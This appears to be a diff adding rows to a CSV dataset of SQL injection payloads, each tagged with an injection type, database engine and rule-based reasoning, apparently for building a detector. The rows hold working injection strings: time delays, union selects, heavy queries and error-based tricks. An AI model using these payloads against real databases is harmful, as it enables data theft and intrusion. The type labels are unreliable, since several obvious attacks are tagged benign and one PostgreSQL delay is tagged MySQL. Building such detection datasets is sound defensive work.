@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+7890,1%' ) rlike sleep ( 5 ) and ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7891,"1 ) where 7748 = 7748 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
+7892,"-9171 ) union all select 6880,6880,6880,6880,6880,6880,6880#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7893,-1772' or 7911 = 4985#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7894,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'zjxk' = 'zjxk",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
+7895,"1' ) where 9091 = 9091 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7896,1' and ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7897,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cssb' = 'cssb",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+7898,"1' and make_set ( 4952 = 7129,7129 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7899,1 ) and 3861 = 5813--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7900,1 ) as afxc where 7497 = 7497,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7901,1' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
+7902,-1711 ) where 9098 = 9098 order by 1#,1,,boolean_blind,generic,0.95,9098 = 9098 or detected — boolean_blind injection (priority 8) on generic,rule-based
+7903,1' in boolean mode ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) #,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+7904,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7905,1' ) where 2928 = 2928 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7906,"1 ) as cnpv where 4902 = 4902 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7907,"-2582'+ ( select ggim where 5346 = 5346 union all select 5346,5346#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7908,"1 ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+7909,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'crkz' = 'crkz",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
+7910,"1' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7911,"-6381%"" or 8571 = 8571--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7912,1' ) as jlae where 1650 = 1650,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7913,"1' where 2774 = 2774 union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7914,"1%"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""%"" = """,1,,boolean_blind,mysql,0.95,) and ( detected — boolean_blind injection (priority 8) on mysql,rule-based
+7915,1 where 7038 = 7038,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7916,1'+ ( select basp where 6953 = 6953,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7917,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'eqle' = 'eqle",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
+7918,-8486%' ) ) ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7919,"-3393"" ) ) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
